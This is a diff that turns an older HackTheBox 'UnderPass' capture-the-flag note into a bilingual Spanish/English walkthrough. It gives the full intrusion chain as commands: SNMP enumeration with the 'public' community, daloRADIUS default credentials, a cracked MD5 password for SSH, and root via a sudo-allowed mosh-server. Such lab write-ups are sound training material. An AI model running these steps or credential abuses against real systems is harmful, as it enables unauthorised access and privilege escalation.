@@ -1,123 +1,144 @@
-1, Recon
-Port scan
-```
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
-|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
-80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
-|_http-title: Apache2 Ubuntu Default Page: It works
-|_http-server-header: Apache/2.4.52 (Ubuntu)
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+# UnderPass [Easy]
 
-UDP 
-68/udp  open|filtered dhcpc
-137/udp open|filtered netbios-ns
-161/udp open          snmp
-162/udp open|filtered snmptrap
+> **ES:** Máquina Linux con SNMP público que delata un daloRADIUS; credenciales por defecto llevan a un hash crackeable y `mosh-server` con sudo da root.
+> **EN:** Linux box with public SNMP leaking a daloRADIUS install; default creds lead to a crackable hash and sudo `mosh-server` gives root.
 
-```
-Page check
-![](images/Pasted%20image%2020241221234932.png)The index page is the default page of Apache 2
-Let's continue to enumerate the web-contents of that.
-But there is nothing found by using dirbuster to find the valid web-content
+| Campo | Valor |
+|-------|-------|
+| **Dificultad** | Easy |
+| **OS** | Linux |
+| **Estado** | Retired |
+| **Maker** | [verificar en app.hackthebox.com/machines/UnderPass] |
+| **URL** | https://app.hackthebox.com/machines/UnderPass |
+| **IP lab** | 10.10.11.48 |
+| **Fecha de resolución** | 2026-09-24 |
 
-So I would continue to check the snmp service
-```
-snmpbulkwalk -c public -v2c 10.10.11.48  
-SNMPv2-MIB::sysDescr.0 = STRING: Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
-SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
-DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (156773) 0:26:07.73
-SNMPv2-MIB::sysContact.0 = STRING: steve@underpass.htb
-SNMPv2-MIB::sysName.0 = STRING: UnDerPass.htb is the only daloradius server in the basin!
-SNMPv2-MIB::sysLocation.0 = STRING: Nevada, U.S.A. but not Vegas
-SNMPv2-MIB::sysServices.0 = INTEGER: 72
-SNMPv2-MIB::sysORLastChange.0 = Timeticks: (1) 0:00:00.01
-SNMPv2-MIB::sysORID.1 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
-SNMPv2-MIB::sysORID.2 = OID: SNMP-MPD-MIB::snmpMPDCompliance
-SNMPv2-MIB::sysORID.3 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
-SNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB
-SNMPv2-MIB::sysORID.5 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
-SNMPv2-MIB::sysORID.6 = OID: TCP-MIB::tcpMIB
-SNMPv2-MIB::sysORID.7 = OID: UDP-MIB::udpMIB
-SNMPv2-MIB::sysORID.8 = OID: IP-MIB::ip
-SNMPv2-MIB::sysORID.9 = OID: SNMP-NOTIFICATION-MIB::snmpNotifyFullCompliance
-SNMPv2-MIB::sysORID.10 = OID: NOTIFICATION-LOG-MIB::notificationLogMIB
-SNMPv2-MIB::sysORDescr.1 = STRING: The SNMP Management Architecture MIB.
-SNMPv2-MIB::sysORDescr.2 = STRING: The MIB for Message Processing and Dispatching.
-SNMPv2-MIB::sysORDescr.3 = STRING: The management information definitions for the SNMP User-based Security Model.
-SNMPv2-MIB::sysORDescr.4 = STRING: The MIB module for SNMPv2 entities
-SNMPv2-MIB::sysORDescr.5 = STRING: View-based Access Control Model for SNMP.
-SNMPv2-MIB::sysORDescr.6 = STRING: The MIB module for managing TCP implementations
-SNMPv2-MIB::sysORDescr.7 = STRING: The MIB module for managing UDP implementations
-SNMPv2-MIB::sysORDescr.8 = STRING: The MIB module for managing IP and ICMP implementations
-SNMPv2-MIB::sysORDescr.9 = STRING: The MIB modules for managing SNMP Notification, plus filtering.
-SNMPv2-MIB::sysORDescr.10 = STRING: The MIB module for logging SNMP Notifications.
-SNMPv2-MIB::sysORUpTime.1 = Timeticks: (1) 0:00:00.01
-SNMPv2-MIB::sysORUpTime.2 = Timeticks: (1) 0:00:00.01
-SNMPv2-MIB::sysORUpTime.3 = Timeticks: (1) 0:00:00.01
-SNMPv2-MIB::sysORUpTime.4 = Timeticks: (1) 0:00:00.01
-SNMPv2-MIB::sysORUpTime.5 = Timeticks: (1) 0:00:00.01
-SNMPv2-MIB::sysORUpTime.6 = Timeticks: (1) 0:00:00.01
-SNMPv2-MIB::sysORUpTime.7 = Timeticks: (1) 0:00:00.01
-SNMPv2-MIB::sysORUpTime.8 = Timeticks: (1) 0:00:00.01
-SNMPv2-MIB::sysORUpTime.9 = Timeticks: (1) 0:00:00.01
-SNMPv2-MIB::sysORUpTime.10 = Timeticks: (1) 0:00:00.01
-HOST-RESOURCES-MIB::hrSystemUptime.0 = Timeticks: (157793) 0:26:17.93
-HOST-RESOURCES-MIB::hrSystemDate.0 = STRING: 2024-12-22,5:1:11.0,+0:0
-HOST-RESOURCES-MIB::hrSystemInitialLoadDevice.0 = INTEGER: 393216
-HOST-RESOURCES-MIB::hrSystemInitialLoadParameters.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
-"
-HOST-RESOURCES-MIB::hrSystemNumUsers.0 = Gauge32: 0
-HOST-RESOURCES-MIB::hrSystemProcesses.0 = Gauge32: 217
-HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = INTEGER: 0
-HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
+---
+
+## 🎯 Objetivo / Goal
+
+> **ES:** Conseguir `user.txt` y `root.txt` vía SNMP (public) → daloRADIUS (`administrator:radius`) → hash MD5 de `svcMosh` → SSH → `sudo mosh-server`.
+> **EN:** Get `user.txt` and `root.txt` via SNMP (public) → daloRADIUS (`administrator:radius`) → `svcMosh` MD5 hash → SSH → `sudo mosh-server`.
+
+---
+
+## 🛠️ Herramientas usadas / Tools used
+
+- [ ] nmap (TCP + UDP)
+- [ ] snmpwalk / snmpbulkwalk
+- [ ] dirsearch / feroxbuster
+- [ ] hash crack (MD5 lookup / hashcat)
+- [ ] ssh
+- [ ] mosh (GTFOBins)
+
+---
+
+## 📋 Pasos / Steps
+
+### Paso 1 — Reconocimiento / Recon
+
+> **ES:** TCP solo 22/SSH y 80/Apache (página por defecto, dirbuster sin hallazgos); en UDP destaca 161/SNMP con comunidad `public` que filtra hostname, contacto y la pista daloRADIUS.
+> **EN:** TCP only 22/SSH and 80/Apache (default page, dirbuster finds nothing); UDP shows 161/SNMP with community `public` leaking hostname, contact and the daloRADIUS hint.
+
+```bash
+nmap -sC -sV -oN nmap_tcp 10.10.11.48
+nmap -sU --top-ports=50 -oN nmap_udp 10.10.11.48
+# 68 dhcpc, 137 netbios-ns, 161 snmp, 162 snmptrap
+nmap --script "snmp* and not snmp-brute" -sU -p 161 10.10.11.48
+snmpbulkwalk -c public -v2c 10.10.11.48
 ```
 
-I found the name of service `daloradius`, by searching about the name, we can get the login page
-`http://10.10.11.48/daloradius/app/users/login.php`
-![](images/Pasted%20image%2020241222000518.png)
-Then I try the default credit `admin:admin`, but it did not work.Then I continue to check the issues of this service, I found another default credit `administrator:radius`
-![](images/Pasted%20image%2020241222000929.png)
-We can use this credit to login successfully in this page `http://underpass.htb/daloradius/app/operators/home-main.php`
-Then we can login to the dashboard
-![](images/Pasted%20image%2020241222001231.png)
+**Resultado / Result:** 22/tcp OpenSSH 8.9, 80/tcp Apache 2.4.52, 161/udp SNMP `public`: `sysDescr Linux underpass 5.15.0-126-generic`, `sysContact steve@underpass.htb`, `sysName "UnDerPass.htb is the only daloradius server in the basin!"`, `sysLocation Nevada, U.S.A. but not Vegas`. Captura de la página Apache en `images/`.
 
-By enumerating the pages, I found the password hash of `svcMosh`
-![](images/Pasted%20image%2020241222001346.png)
-`412DD4759978ACFCC81DEAB01B382403`, crack this md5 hash, I get `underwaterfriends`
+---
 
-I guess we can use this password to login the ssh.
-`ssh svcMosh@10.10.11.48`
+### Paso 2 — Enumeración / Enumeration
 
-2, shell as root
-By check `sudo -l` we found 
-```
-Matching Defaults entries for svcMosh on localhost:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
-    use_pty
+> **ES:** El login de daloRADIUS vive en `/daloradius/app/users/login.php` (usuarios) y `/daloradius/app/operators/` (operadores). `dirsearch`/`feroxbuster` exponen además `.gitignore`, `ChangeLog`, `Dockerfile`, `README.md` y `docker-compose.yml` (con credenciales de ejemplo `radius:radiusdbpw`, `testing123`).
+> **EN:** The daloRADIUS login lives at `/daloradius/app/users/login.php` (users) and `/daloradius/app/operators/` (operators). `dirsearch`/`feroxbuster` also expose `.gitignore`, `ChangeLog`, `Dockerfile`, `README.md` and `docker-compose.yml` (with sample creds `radius:radiusdbpw`, `testing123`).
 
-User svcMosh may run the following commands on localhost:
-    (ALL) NOPASSWD: /usr/bin/mosh-server
+```bash
+dirsearch -u http://10.10.11.48/daloradius/
+feroxbuster -u http://10.10.11.48/daloradius/ -x html,php,txt,php.bak -d 3
+curl -s http://10.10.11.48/daloradius/docker-compose.yml | head -40
+# MYSQL_USER=radius / MYSQL_PASSWORD=radiusdbpw / DEFAULT_CLIENT_SECRET=testing123
 ```
 
-we just need to make this payload
-`mosh --server="sudo /usr/bin/mosh-server" localhost`
+**Resultado / Result:** Panel de operadores en `/daloradius/app/operators/login.php`. `admin:admin` falla; el default documentado es `administrator:radius`. Capturas del login/dashboard/lista de usuarios en `images/` y en `img/` (`img/image_20250454-225404.png`, `img/image_20250455-225512.png`, `img/image_20250459-225910.png`).
+
+---
+
+### Paso 3 — Acceso inicial (foothold) / Initial access
+
+> **ES:** Login con defecto `administrator:radius` en operadores; en la lista de usuarios se lee el hash MD5 de `svcMosh` y se crackea (lookup/diccionario) → SSH.
+> **EN:** Default login `administrator:radius` in operators; user list leaks `svcMosh` MD5 hash, cracked (lookup/dictionary) → SSH.
+
+```bash
+# login web manual: http://underpass.htb/daloradius/app/operators/home-main.php
+# hash obtenido: svcMosh:412DD4759978ACFCC81DEAB01B382403
+# md5(412DD4759978ACFCC81DEAB01B382403) -> underwaterfriends
+ssh svcMosh@10.10.11.48  # underwaterfriends (credencial de laboratorio retirado)
 ```
-mosh:
-表示启动 mosh 客户端。
-mosh 是一种远程登录工具，类似于 ssh，但它使用 UDP 协议，支持断线重连和更流畅的体验。
 
---server="sudo /usr/bin/mosh-server":
---server 选项指定了 mosh 客户端在目标主机上启动的服务器命令。
-通常，mosh 会在目标主机上自动运行默认的 mosh-server 命令。这里，指定使用 sudo 提权来运行 /usr/bin/mosh-server。
-即，这条命令会以 sudo 权限在目标主机上启动 mosh-server。
+**Resultado / Result:** SSH válido `svcMosh:underwaterfriends`.
 
-localhost:
-指定连接的目标主机为 localhost（本地主机）。
-这表明 mosh 将尝试连接到当前机器，而不是远程主机。
+---
 
+### Paso 4 — Usuario (user.txt) / User
+
+> **ES:** Ya como `svcMosh` se lee `/home/svcMosh/user.txt` (flag omitida).
+> **EN:** As `svcMosh` read `/home/svcMosh/user.txt` (flag redacted).
+
+```bash
+id; cat ~/user.txt
 ```
-Then we can get the root shell here.
+
+**Resultado / Result:** `user.txt` leído.
+
+---
+
+### Paso 5 — Root (root.txt) / Privilege escalation
+
+> **ES:** `sudo -l` permite `(ALL) NOPASSWD: /usr/bin/mosh-server` (con `use_pty`). Como `mosh` permite elegir el comando servidor remoto (`--server`), se ejecuta `mosh --server="sudo /usr/bin/mosh-server" localhost`: el cliente habla con un `mosh-server` corriendo como root en local y entrega terminal root (GTFOBins).
+> **EN:** `sudo -l` allows `(ALL) NOPASSWD: /usr/bin/mosh-server` (with `use_pty`). Since `mosh` lets you choose the remote server command (`--server`), run `mosh --server="sudo /usr/bin/mosh-server" localhost`: the client talks to a `mosh-server` running as root locally and yields a root terminal (GTFOBins).
+
+```bash
+sudo -l
+# User svcMosh may run the following commands on localhost:
+#     (ALL) NOPASSWD: /usr/bin/mosh-server
+mosh --server="sudo /usr/bin/mosh-server" localhost
+whoami  # root
+cat /root/root.txt  # formato parcial ofuscado
+```
+
+**Resultado / Result:** Root vía `mosh-server` con sudo sin password. Técnica: abuso de binario permitido (GTFOBins).
+
+---
+
+## 🧠 Lo aprendido / Learned
+
+> **ES:** SNMP con comunidad pública como vector de info; daloRADIUS con credenciales por defecto; hashes MD5 débiles; privesc con `mosh-server`.
+> **EN:** SNMP public community as info vector; daloRADIUS default creds; weak MD5 hashes; `mosh-server` privesc.
+
+- [ ] Siempre auditar UDP/SNMP, no solo TCP
+- [ ] Cambiar credenciales por defecto en paneles
+- [ ] Revisar `sudo -l` y GTFOBins
+
+---
+
+## 📚 Fuentes y Referencias / Sources
+
+- **Fuente:** Nota local `index.md` (notas propias en chino/inglés, con capturas en `img/`) — randark/nota migrada
+- **Walkthrough de referencia:** Nota previa en inglés `Walkthrough.md` (legacy: SNMP completo, `admin:admin` fallido, hash `svcMosh`, explicación `mosh --server`) — wither/nota migrada
+- **Walkthrough de referencia:** HTB UnderPass — https://0xdf.gitlab.io/2025/05/10/htb-underpass.html — 0xdf
+- **Fecha de acceso:** 2026-09-24
+- **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita)
+
+---
+
+## ⚠️ Aviso Legal / Disclaimer
+
+> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de máquinas activas.
+> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish flags of active machines.
+
+_Fecha de edición: 2026-09-24_
